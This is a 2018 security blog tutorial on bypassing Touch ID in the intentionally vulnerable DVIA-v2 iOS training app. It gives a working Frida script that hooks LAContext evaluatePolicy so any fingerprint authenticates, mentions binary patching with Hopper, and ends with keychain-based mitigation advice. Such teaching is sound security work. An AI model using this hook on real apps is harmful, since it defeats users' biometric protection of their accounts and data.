---
layout: post
title: "iOS Application Security Part 50 - Touch ID Bypass with Frida"
date: 2018-07-26 07:48
comments: true
categories: security 
---
In the previous article, we looked at Runtime Manipulation with Frida. In this article, we will look at how we can bypass Touch ID authentication in certain iOS applications using Frida. We will be performing the tests on the swift version of Damn Vulnerable iOS app which can be downloaded from damnvulnerableiosapp.com.

Open the app and navigate under the section Touch/Face ID Bypass

Authentication can be done in multiple ways, and can use different languages (Objective-C or Swift). One of the ways is to use the LAContext class using the Local Authentication framework. The evaluatePolicy:localizedReason:reply: method from the LAContext class presents a dialog to the user which can ask for the user to confirm the action with biometric authentication through their fingerprint. If the method returns success, the relevant action is performed. However, the action that is performed after authentication is in no way correlated with how the authentication was done. There is no way for the iOS app to determine whether the authentication was performed with a valid fingerprint, or whether the method was hooked. The following code snippet from DVIA-v2 shows the implementation (from the file TouchIDAuthentication.m) using the LAContext class.

<!--more-->

<pre>	+(void)authenticateWithTouchID {

	    LAContext *myContext = [[LAContext alloc] init];
	    NSError *authError = nil;
	    NSString *myLocalizedReasonString = @"Please authenticate yourself";

	    if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
	        [myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
	                  localizedReason:myLocalizedReasonString
	                            reply:^(BOOL success, NSError *error) {
	                                if (success) {
	                                    dispatch_async(dispatch_get_main_queue(), ^{
	                                    [TouchIDAuthentication showAlert:@"Success" withTitle:@"Authentication Successful"];
	                                    });
	                                } else {
	                                    dispatch_async(dispatch_get_main_queue(), ^{
	                                       [TouchIDAuthentication showAlert:@"Error" withTitle:@"Authentication Failed !!"];
	                                    });
	                                }
	                            }];
	    } else {
	        dispatch_async(dispatch_get_main_queue(), ^{
	            [TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID" withTitle:@"Error"];
	        });
	    }
	}

</pre>

It is possible to just hook the evaluatePolicy:localizedReason:reply: method and make it return true. This can be done with the following Frida script.

<pre>	if(ObjC.available) {
		var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
		Interceptor.attach(hook.implementation, {
			onEnter: function(args) {
				var block = new ObjC.Block(args[4]);
				const appCallback = block.implementation;
				block.implementation = function (error,value)  {
					const result = appCallback(1, null);
					return result;
				};
			},
		});
	} 

</pre>

![1]({{site.baseurl}}/images/posts/ios50/1.png)

Now go the Touch/Face ID Bypass -> Objective-C implementation in DVIA-v2 and tap on the fingerprint button.

![2]({{site.baseurl}}/images/posts/ios50/2.PNG)

Now put the incorrect fingerprint. You will see that since the method is hooked, the authentication is successful.

![3]({{site.baseurl}}/images/posts/ios50/3.PNG)

The following function from DVIA-v2 shows the Swift implementation of the same thing. Since this can't be manipulated, it can still be patched and the function flow could be modified to go inside the if loop directly. The patching can be done with Hopper followed by signing with jtool.

<pre>	@IBAction func touchIDTapped(_ sender: Any) {
	        let context = LAContext()
	        var error: NSError?

	        if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
	            let reason = "Please authenticate yourself"

	            context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: reason) {
	                [unowned self] success, authenticationError in

	                DispatchQueue.main.async {
	                    if success {
	                        DVIAUtilities.showAlert(title: "Success", message: "Authentication Successful", viewController: self)
	                    } else {
	                        DVIAUtilities.showAlert(title: "Error", message: "Authentication Failed", viewController: self)
	                    }
	                }
	            }
	        } else {
	           DVIAUtilities.showAlert(title: "Touch ID not available", message: "Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device", viewController: self)
	        }
	    }
</pre>

In general, the vulnerability arises from the fact that the authentication and the resulting action after a successful authentication are independent of each other. A better way to securely save the data would be to save the data in the keychain and protect it with appropriate keychain attributes (for e.g ksecattraccessiblewhenpasscodesetthisdeviceonly), which require touch ID or device passcode authentication to access the keychain content. This will make it harder for the attacker to get the data since to gather the information from the keychain the user would actually have to authenticate with Touch ID or enter the passcode, depending on which access control he applied, and also the logic is managed by the OS and not the application. Even though biometric authentication via the Local Authentication framework is easy to implement, it is not recommended to be used for sensitive applications, such as banking or other financial apps.

In the next article, we will look at dumping unencrypted IPAs from the device and dynamic instrumentation on a non-jailbroken device using Frida.